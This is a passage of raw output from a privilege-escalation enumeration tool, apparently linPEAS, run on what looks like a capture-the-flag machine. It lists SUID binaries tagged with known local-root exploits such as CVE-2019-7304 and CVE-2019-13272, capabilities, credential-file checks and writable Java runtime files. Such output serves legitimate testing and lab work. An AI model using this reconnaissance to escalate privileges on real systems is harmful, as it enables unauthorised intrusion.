-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/16928/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind




╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r----- 1 www-data adm 28947 Jun 17 17:20 /var/log/nginx/access.log

-rw-r----- 1 www-data adm 814 Jun 17 17:20 /var/log/nginx/error.log

╔══════════╣ Analyzing Windows Files (limit 70)































-rw------- 1 aepike aepike 6839 Feb 19 16:15 /opt/tomcat6/apache-tomcat-6.0.53/conf/server.xml




















╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
-rw-r--r-- 1 aepike aepike 3771 Apr  4  2018 /home/aepike/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/16574/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/16928/etc/skel/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 aepike aepike 807 Apr  4  2018 /home/aepike/.profile
-rw-r--r-- 1 root root 655 Apr 19  2022 /snap/core/16574/etc/skel/.profile
-rw-r--r-- 1 root root 655 Apr 19  2022 /snap/core/16928/etc/skel/.profile






                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 40K Jun 14  2022 /snap/core/16574/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/16574/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/16574/bin/ping6
-rwsr-xr-x 1 root root 40K Nov 29  2022 /snap/core/16574/bin/su
-rwsr-xr-x 1 root root 27K Jun 14  2022 /snap/core/16574/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Nov 29  2022 /snap/core/16574/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Nov 29  2022 /snap/core/16574/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Nov 29  2022 /snap/core/16574/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Nov 29  2022 /snap/core/16574/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Nov 29  2022 /snap/core/16574/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K May 24  2023 /snap/core/16574/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Sep 14  2023 /snap/core/16574/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Aug  8  2023 /snap/core/16574/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 125K Dec  1  2023 /snap/core/16574/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /snap/core/16574/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 40K Jun 14  2022 /snap/core/16928/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/16928/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/16928/bin/ping6
-rwsr-xr-x 1 root root 40K Feb  7 10:59 /snap/core/16928/bin/su
-rwsr-xr-x 1 root root 27K Jun 14  2022 /snap/core/16928/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Feb  7 10:59 /snap/core/16928/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Feb  7 10:59 /snap/core/16928/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Feb  7 10:59 /snap/core/16928/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Feb  7 10:59 /snap/core/16928/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Feb  7 10:59 /snap/core/16928/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K May 24  2023 /snap/core/16928/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Sep 14  2023 /snap/core/16928/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Jan  9 15:07 /snap/core/16928/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 125K Feb 18 16:44 /snap/core/16928/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /snap/core/16928/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K Nov 29  2022 /bin/su
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 427K Mar 30  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 99K May  5  2023 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 128K May 29  2023 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root messagebus 42K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14K Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 146K Apr  4  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 40K Nov 29  2022 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 22K Jan 12  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 37K Nov 29  2022 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 37K Nov 29  2022 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75K Nov 29  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44K Nov 29  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 75K Nov 29  2022 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 59K Nov 29  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 35K Feb  2  2023 /snap/core/16574/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Feb  2  2023 /snap/core/16574/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Nov 29  2022 /snap/core/16574/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K May 10  2022 /snap/core/16574/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/16574/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Nov 29  2022 /snap/core/16574/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/16574/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/16574/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/16574/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Aug  8  2023 /snap/core/16574/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K Jun 14  2022 /snap/core/16574/usr/bin/wall
-rwxr-sr-x 1 root shadow 35K Feb  2  2023 /snap/core/16928/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Feb  2  2023 /snap/core/16928/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Feb  7 10:59 /snap/core/16928/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K May 10  2022 /snap/core/16928/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/16928/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Feb  7 10:59 /snap/core/16928/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/16928/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/16928/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/16928/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Jan  9 15:07 /snap/core/16928/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K Jun 14  2022 /snap/core/16928/usr/bin/wall
-rwxr-sr-x 1 root shadow 34K Feb  2  2023 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Feb  2  2023 /sbin/unix_chkpwd
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root ssh 355K Mar 30  2022 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 71K Nov 29  2022 /usr/bin/chage
-rwxr-sr-x 1 root shadow 23K Nov 29  2022 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 39K May 10  2022 /usr/bin/crontab
-rwxr-sr-x 1 root tty 31K Sep 16  2020 /usr/bin/wall
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so
/etc/ld.so.conf
Content of /etc/ld.so.conf:
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
  - /usr/lib/x86_64-linux-gnu/libfakeroot
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
══╣ Current shell capabilities
CapInh:  0x0000000000000000=
CapPrm:  0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:	 0x0000000000000000=
CapPrm:	 0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:	 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:	 0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3194 Mar 26  2018 sbin.dhclient
-rw-r--r-- 1 root root   125 Nov 23  2018 usr.bin.lxc-start
-rw-r--r-- 1 root root  2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root 28486 May 29  2023 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1450 Feb 10  2023 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 36
drwxr-xr-x  2 root root 4096 Apr  2 12:12 .
drwxr-xr-x 94 root root 4096 Apr 10 16:05 ..
-rw-r--r--  1 root root   96 Aug 19  2018 01-locale-fix.sh
-rw-r--r--  1 root root  835 May 29  2023 apps-bin-path.sh
-rw-r--r--  1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--  1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x  1 root root  873 May 11  2019 Z99-cloudinit-warnings.sh
-rwxr-xr-x  1 root root 3417 May 11  2019 Z99-cloud-locale-test.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/aepike/flag.txt
/home/mrg
/home/mrg/Development
/home/mrg/Development/eclipseWorkspace
/home/mrg/Development/eclipseWorkspace/.metadata
/home/mrg/Development/eclipseWorkspace/.metadata/.plugins
/home/mrg/Development/eclipseWorkspace/.metadata/.plugins/org.eclipse.wst.server.core
/home/mrg/Development/eclipseWorkspace/.metadata/.plugins/org.eclipse.wst.server.core/tmp2
/home/mrg/Development/eclipseWorkspace/.metadata/.plugins/org.eclipse.wst.server.core/tmp2/wtpwebapps
/home/mrg/Development/eclipseWorkspace/.metadata/.plugins/org.eclipse.wst.server.core/tmp2/wtpwebapps/WSDLRefactor
/home/mrg/Development/eclipseWorkspace/.metadata/.plugins/org.eclipse.wst.server.core/tmp2/wtpwebapps/WSDLRefactor/WEB-INF
/home/mrg/Development/eclipseWorkspace/.metadata/.plugins/org.eclipse.wst.server.core/tmp2/wtpwebapps/WSDLRefactor/WEB-INF/attachments
/root/
/var/www
/var/www/html
/var/www/html/index.nginx-debian.html

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw-r--r-- 1 root root 48 Feb 19 16:08 /home/aepike/flag.txt

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/home/aepike
/opt
/opt/java
/opt/java/jre1.6.0_45
/opt/java/jre1.6.0_45/bin
/opt/java/jre1.6.0_45/bin/java
/opt/java/jre1.6.0_45/bin/java_vm
/opt/java/jre1.6.0_45/bin/javaws
/opt/java/jre1.6.0_45/bin/jcontrol
/opt/java/jre1.6.0_45/bin/keytool
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/COPYRIGHT
/opt/java/jre1.6.0_45/javaws
/opt/java/jre1.6.0_45/lib
/opt/java/jre1.6.0_45/lib/alt-rt.jar
/opt/java/jre1.6.0_45/lib/alt-string.jar
/opt/java/jre1.6.0_45/lib/amd64
/opt/java/jre1.6.0_45/lib/amd64/headless
/opt/java/jre1.6.0_45/lib/amd64/headless/libmawt.so
/opt/java/jre1.6.0_45/lib/amd64/jli
/opt/java/jre1.6.0_45/lib/amd64/jli/libjli.so
/opt/java/jre1.6.0_45/lib/amd64/jvm.cfg
/opt/java/jre1.6.0_45/lib/amd64/libawt.so
/opt/java/jre1.6.0_45/lib/amd64/libcmm.so
/opt/java/jre1.6.0_45/lib/amd64/libdcpr.so
/opt/java/jre1.6.0_45/lib/amd64/libdeploy.so
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/amd64/motif21/libmawt.so
/opt/java/jre1.6.0_45/lib/amd64/native_threads
/opt/java/jre1.6.0_45/lib/amd64/native_threads/libhpi.so
/opt/java/jre1.6.0_45/lib/amd64/server
/opt/java/jre1.6.0_45/lib/amd64/server/libjvm.so
/opt/java/jre1.6.0_45/lib/amd64/server/Xusage.txt
/opt/java/jre1.6.0_45/lib/amd64/xawt
/opt/java/jre1.6.0_45/lib/amd64/xawt/libmawt.so
/opt/java/jre1.6.0_45/lib/applet
/opt/java/jre1.6.0_45/lib/audio
/opt/java/jre1.6.0_45/lib/audio/soundbank.gm
/opt/java/jre1.6.0_45/lib/calendars.properties
/opt/java/jre1.6.0_45/lib/charsets.jar
/opt/java/jre1.6.0_45/lib/classlist
/opt/java/jre1.6.0_45/lib/cmm
/opt/java/jre1.6.0_45/lib/cmm/CIEXYZ.pf
/opt/java/jre1.6.0_45/lib/cmm/GRAY.pf
/opt/java/jre1.6.0_45/lib/cmm/LINEAR_RGB.pf
/opt/java/jre1.6.0_45/lib/cmm/PYCC.pf
/opt/java/jre1.6.0_45/lib/cmm/sRGB.pf
/opt/java/jre1.6.0_45/lib/content-types.properties
/opt/java/jre1.6.0_45/lib/deploy
/opt/java/jre1.6.0_45/lib/deploy/ffjcext.zip
/opt/java/jre1.6.0_45/lib/deploy.jar
/opt/java/jre1.6.0_45/lib/deploy/java-icon.ico
/opt/java/jre1.6.0_45/lib/deploy/messages_de.properties
/opt/java/jre1.6.0_45/lib/deploy/messages_es.properties
/opt/java/jre1.6.0_45/lib/deploy/messages_fr.properties
/opt/java/jre1.6.0_45/lib/deploy/messages_it.properties
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/desktop
/opt/java/jre1.6.0_45/lib/desktop/applications
/opt/java/jre1.6.0_45/lib/desktop/applications/sun_java.desktop
/opt/java/jre1.6.0_45/lib/desktop/applications/sun-java.desktop
/opt/java/jre1.6.0_45/lib/desktop/applications/sun-javaws.desktop
/opt/java/jre1.6.0_45/lib/desktop/icons
/opt/java/jre1.6.0_45/lib/desktop/icons/hicolor
/opt/java/jre1.6.0_45/lib/desktop/icons/hicolor/16x16
/opt/java/jre1.6.0_45/lib/desktop/icons/hicolor/16x16/apps
/opt/java/jre1.6.0_45/lib/desktop/icons/hicolor/16x16/mimetypes
/opt/java/jre1.6.0_45/lib/desktop/icons/hicolor/48x48
/opt/java/jre1.6.0_45/lib/desktop/icons/hicolor/48x48/apps
/opt/java/jre1.6.0_45/lib/desktop/icons/hicolor/48x48/mimetypes
/opt/java/jre1.6.0_45/lib/desktop/icons/HighContrast
/opt/java/jre1.6.0_45/lib/desktop/icons/HighContrast/16x16
/opt/java/jre1.6.0_45/lib/desktop/icons/HighContrast/16x16/apps
/opt/java/jre1.6.0_45/lib/desktop/icons/HighContrast/16x16/mimetypes
/opt/java/jre1.6.0_45/lib/desktop/icons/HighContrast/48x48
/opt/java/jre1.6.0_45/lib/desktop/icons/HighContrast/48x48/apps
/opt/java/jre1.6.0_45/lib/desktop/icons/HighContrast/48x48/mimetypes
/opt/java/jre1.6.0_45/lib/desktop/icons/HighContrastInverse
/opt/java/jre1.6.0_45/lib/desktop/icons/HighContrastInverse/16x16
/opt/java/jre1.6.0_45/lib/desktop/icons/HighContrastInverse/16x16/apps
/opt/java/jre1.6.0_45/lib/desktop/icons/HighContrastInverse/16x16/mimetypes
/opt/java/jre1.6.0_45/lib/desktop/icons/HighContrastInverse/48x48
/opt/java/jre1.6.0_45/lib/desktop/icons/HighContrastInverse/48x48/apps
/opt/java/jre1.6.0_45/lib/desktop/icons/HighContrastInverse/48x48/mimetypes
/opt/java/jre1.6.0_45/lib/desktop/icons/LowContrast
/opt/java/jre1.6.0_45/lib/desktop/icons/LowContrast/16x16
/opt/java/jre1.6.0_45/lib/desktop/icons/LowContrast/16x16/apps
/opt/java/jre1.6.0_45/lib/desktop/icons/LowContrast/16x16/mimetypes
/opt/java/jre1.6.0_45/lib/desktop/icons/LowContrast/48x48
/opt/java/jre1.6.0_45/lib/desktop/icons/LowContrast/48x48/apps
/opt/java/jre1.6.0_45/lib/desktop/icons/LowContrast/48x48/mimetypes
/opt/java/jre1.6.0_45/lib/desktop/mime
/opt/java/jre1.6.0_45/lib/desktop/mime/packages
/opt/java/jre1.6.0_45/lib/desktop/mime/packages/x-java-archive.xml
/opt/java/jre1.6.0_45/lib/desktop/mime/packages/x-java-jnlp-file.xml
/opt/java/jre1.6.0_45/lib/ext
/opt/java/jre1.6.0_45/lib/ext/dnsns.jar
/opt/java/jre1.6.0_45/lib/ext/localedata.jar
/opt/java/jre1.6.0_45/lib/ext/meta-index
/opt/java/jre1.6.0_45/lib/ext/sunjce_provider.jar
/opt/java/jre1.6.0_45/lib/ext/sunpkcs11.jar
/opt/java/jre1.6.0_45/lib/flavormap.properties
/opt/java/jre1.6.0_45/lib/fontconfig.bfc
/opt/java/jre1.6.0_45/lib/fontconfig.properties.src
/opt/java/jre1.6.0_45/lib/fontconfig.RedHat.2.1.bfc
/opt/java/jre1.6.0_45/lib/fontconfig.RedHat.2.1.properties.src
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/fonts/fonts.dir
/opt/java/jre1.6.0_45/lib/fonts/LucidaBrightDemiBold.ttf
/opt/java/jre1.6.0_45/lib/fonts/LucidaBrightDemiItalic.ttf
/opt/java/jre1.6.0_45/lib/fonts/LucidaBrightItalic.ttf
/opt/java/jre1.6.0_45/lib/fonts/LucidaBrightRegular.ttf
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/im
/opt/java/jre1.6.0_45/lib/images
/opt/java/jre1.6.0_45/lib/images/cursors
/opt/java/jre1.6.0_45/lib/images/cursors/cursors.properties
/opt/java/jre1.6.0_45/lib/images/icons
/opt/java/jre1.6.0_45/lib/im/indicim.jar
/opt/java/jre1.6.0_45/lib/im/thaiim.jar
/opt/java/jre1.6.0_45/lib/javaws.jar
/opt/java/jre1.6.0_45/lib/jce.jar
/opt/java/jre1.6.0_45/lib/jexec
/opt/java/jre1.6.0_45/lib/jsse.jar
/opt/java/jre1.6.0_45/lib/jvm.hprof.txt
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/locale/de
/opt/java/jre1.6.0_45/lib/locale/de/LC_MESSAGES
/opt/java/jre1.6.0_45/lib/locale/de/LC_MESSAGES/sunw_java_plugin.mo
/opt/java/jre1.6.0_45/lib/locale/es
/opt/java/jre1.6.0_45/lib/locale/es/LC_MESSAGES
/opt/java/jre1.6.0_45/lib/locale/es/LC_MESSAGES/sunw_java_plugin.mo
/opt/java/jre1.6.0_45/lib/locale/fr
/opt/java/jre1.6.0_45/lib/locale/fr/LC_MESSAGES
/opt/java/jre1.6.0_45/lib/locale/fr/LC_MESSAGES/sunw_java_plugin.mo
/opt/java/jre1.6.0_45/lib/locale/it
/opt/java/jre1.6.0_45/lib/locale/it/LC_MESSAGES
/opt/java/jre1.6.0_45/lib/locale/it/LC_MESSAGES/sunw_java_plugin.mo
/opt/java/jre1.6.0_45/lib/locale/ja
/opt/java/jre1.6.0_45/lib/locale/ja/LC_MESSAGES
/opt/java/jre1.6.0_45/lib/locale/ja/LC_MESSAGES/sunw_java_plugin.mo
/opt/java/jre1.6.0_45/lib/locale/ko
/opt/java/jre1.6.0_45/lib/locale/ko/LC_MESSAGES
/opt/java/jre1.6.0_45/lib/locale/ko/LC_MESSAGES/sunw_java_plugin.mo
/opt/java/jre1.6.0_45/lib/locale/ko.UTF-8
/opt/java/jre1.6.0_45/lib/locale/ko.UTF-8/LC_MESSAGES
/opt/java/jre1.6.0_45/lib/locale/ko.UTF-8/LC_MESSAGES/sunw_java_plugin.mo
/opt/java/jre1.6.0_45/lib/locale/sv
/opt/java/jre1.6.0_45/lib/locale/sv/LC_MESSAGES
/opt/java/jre1.6.0_45/lib/locale/sv/LC_MESSAGES/sunw_java_plugin.mo
/opt/java/jre1.6.0_45/lib/locale/zh
/opt/java/jre1.6.0_45/lib/locale/zh.GBK
/opt/java/jre1.6.0_45/lib/locale/zh.GBK/LC_MESSAGES
/opt/java/jre1.6.0_45/lib/locale/zh.GBK/LC_MESSAGES/sunw_java_plugin.mo
/opt/java/jre1.6.0_45/lib/locale/zh_HK.BIG5HK
/opt/java/jre1.6.0_45/lib/locale/zh_HK.BIG5HK/LC_MESSAGES
/opt/java/jre1.6.0_45/lib/locale/zh_HK.BIG5HK/LC_MESSAGES/sunw_java_plugin.mo
/opt/java/jre1.6.0_45/lib/locale/zh/LC_MESSAGES
/opt/java/jre1.6.0_45/lib/locale/zh/LC_MESSAGES/sunw_java_plugin.mo
/opt/java/jre1.6.0_45/lib/locale/zh_TW
/opt/java/jre1.6.0_45/lib/locale/zh_TW.BIG5
/opt/java/jre1.6.0_45/lib/locale/zh_TW.BIG5/LC_MESSAGES
/opt/java/jre1.6.0_45/lib/locale/zh_TW.BIG5/LC_MESSAGES/sunw_java_plugin.mo
/opt/java/jre1.6.0_45/lib/locale/zh_TW/LC_MESSAGES
/opt/java/jre1.6.0_45/lib/locale/zh_TW/LC_MESSAGES/sunw_java_plugin.mo
/opt/java/jre1.6.0_45/lib/logging.properties
/opt/java/jre1.6.0_45/lib/management
/opt/java/jre1.6.0_45/lib/management-agent.jar
/opt/java/jre1.6.0_45/lib/management/jmxremote.access
/opt/java/jre1.6.0_45/lib/management/jmxremote.password.template
/opt/java/jre1.6.0_45/lib/management/management.properties
/opt/java/jre1.6.0_45/lib/management/snmp.acl.template
/opt/java/jre1.6.0_45/lib/meta-index
/opt/java/jre1.6.0_45/lib/net.properties
/opt/java/jre1.6.0_45/lib/oblique-fonts
/opt/java/jre1.6.0_45/lib/oblique-fonts/fonts.dir
/opt/java/jre1.6.0_45/lib/oblique-fonts/LucidaSansDemiOblique.ttf
/opt/java/jre1.6.0_45/lib/oblique-fonts/LucidaSansOblique.ttf
/opt/java/jre1.6.0_45/lib/oblique-fonts/LucidaTypewriterBoldOblique.ttf
/opt/java/jre1.6.0_45/lib/oblique-fonts/LucidaTypewriterOblique.ttf
/opt/java/jre1.6.0_45/lib/plugin.jar
/opt/java/jre1.6.0_45/lib/psfontj2d.properties
/opt/java/jre1.6.0_45/lib/psfont.properties.ja
/opt/java/jre1.6.0_45/lib/resources.jar
/opt/java/jre1.6.0_45/lib/rt.jar
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/security/blacklist
/opt/java/jre1.6.0_45/lib/security/cacerts
/opt/java/jre1.6.0_45/lib/security/java.policy
/opt/java/jre1.6.0_45/lib/security/java.security
/opt/java/jre1.6.0_45/lib/security/javaws.policy
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/servicetag
/opt/java/jre1.6.0_45/lib/sound.properties
/opt/java/jre1.6.0_45/lib/zi
/opt/java/jre1.6.0_45/lib/zi/Africa
/opt/java/jre1.6.0_45/lib/zi/Africa/Abidjan
/opt/java/jre1.6.0_45/lib/zi/Africa/Accra
/opt/java/jre1.6.0_45/lib/zi/Africa/Addis_Ababa
